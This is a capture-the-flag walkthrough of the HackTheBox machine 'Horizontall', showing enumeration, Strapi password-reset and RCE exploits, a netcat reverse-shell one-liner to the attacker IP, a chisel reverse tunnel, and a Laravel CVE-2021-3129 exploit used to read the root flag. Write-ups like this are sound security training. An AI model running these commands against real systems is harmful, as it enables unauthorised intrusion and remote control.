# HORIZONTALL
### User Flag

```bash
[kali@kali ~]$ sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.105
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 63
```

Nothing interesting appears fuzzing for directories or file, So I tried scanning for virtual hosts

```bash
[kali@kali ~]$ ffuf -w ~/wordlist/subdomains-top1million-110000.txt:FUZZ -u http://horizontall.htb/ -H 'Host: FUZZ.horizontall.htb' -fs 194 -v -t 200
...
[Status: 200, Size: 901, Words: 43, Lines: 2]
| URL | http://horizontall.htb/
    * FUZZ: www

[Status: 200, Size: 413, Words: 76, Lines: 20]
| URL | http://horizontall.htb/
    * FUZZ: api-prod
```

Now lets fuzz the VHOST api-prod

```bash
[kali@kali ~]$ ffuf -w ~/wordlist/directories.txt -u http://horizontall.htb/FUZZ -v -t 200
...
[Status: 200, Size: 854, Words: 98, Lines: 17]
| URL | http://api-prod.horizontall.htb/admin
    * FUZZ: admin

```
If we chek the page we'll find a strapi login page, and searching for strapi vulnerabilties we found https://www.exploit-db.com/exploits/50239, so let's run it.
(you can check the strapi version in http://api-prod.horizontall.htb/admin/init)

```bash
[kali@kali ~]$python3 50239.py http://api-prod.horizontall.htb
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQxNzQwODgwLCJleHAiOjE2NDQzMzI4ODB9.luB-yz5Zzm5mWVVSJBL34oBFohrjjTdSqtRV7m9hvvY
```

Searching for this exploit I found another one that requires a JWT token so let's try to make a reverse shell with it https://www.exploit-db.com/exploits/50238
```bash
[kali@kali ~]$ nc -lnvvvp 5555
...
[kali@kali ~]$ python3 50238.py http://api-prod.horizontall.htb eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQxNTg2NjM5LCJleHAiOjE2NDQxNzg2Mzl9.ZUJptHdyrooFivW8npIG_JVsBKGrimccmY6QC14mGv4 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.243 5555 >/tmp/f" 10.10.14.243

[+] Successful operation!!!

```

Let's get user flag then

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
strapi@horizontall:~/myapi$ cat home/developer/user.txt
```

### Root flag

```bash
strapi@horizontall:~/myapi$ netstat -antlp | grep LISTEN
netstat -antlp | grep LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1835/node /usr/bin/
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
```

If we try looking at ports with curl we will find something interesting in port 8000 so let's do a remote port forwarding to see it from our browser

```bash
[kali@kali ~]$ cp /usr/bin/chisel .
[kali@kali ~]$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
...
strapi@horizontall:~/myapi$ wget http://10.10.14.243:80/chisel
wget http://10.10.14.243:80/chisel
--2022-01-09 15:18:38--  http://10.10.14.243/chisel
Connecting to 10.10.14.243:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8750072 (8.3M) [application/octet-stream]
Saving to: ‘chisel.1’

chisel.1            100%[===================>]   8.34M  7.27MB/s    in 1.1s    

2022-01-09 15:18:40 (7.27 MB/s) - ‘chisel.1’ saved [8750072/8750072]

strapi@horizontall:~/myapi$ chmod a+x chisel    

```

```bash
[kali@kali ~]$ chisel server -p 1234 --reverse  
2022/01/09 10:03:21 server: Reverse tunnelling enabled
2022/01/09 10:03:21 server: Fingerprint agr0rkd/+jKcuiD83s9b2zKVGbRv6r07aAVo6oRGxmg=
...
strapi@horizontall:~/myapi$ ./chisel client 10.10.14.243:1234 R:8080:127.0.0.1:8000
<isel client 10.10.14.243:1234 R:8080:127.0.0.1:8000
2022/01/09 15:24:41 client: Connecting to ws://10.10.14.243:1234
2022/01/09 15:24:41 client: Connected (Latency 51.978835ms)
```

We see a Laravel webpage if we search for "Lavarel port forwarding exploit" we find https://github.com/nth347/CVE-2021-3129_exploit.
So let's try it out

```bash
[kali@kali ~]$ /exploit.py http://localhost:8080 Monolog/RCE1 "cat /root/root.txt"
[i] Trying to clear logs
[+] Logs cleared
[i] PHPGGC not found. Cloning it
Cloning into 'phpggc'...
remote: Enumerating objects: 2776, done.
remote: Counting objects: 100% (1118/1118), done.
remote: Compressing objects: 100% (640/640), done.
remote: Total 2776 (delta 459), reused 955 (delta 334), pack-reused 1658
Receiving objects: 100% (2776/2776), 412.30 KiB | 1.93 MiB/s, done.
Resolving deltas: 100% (1101/1101), done.
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited
```
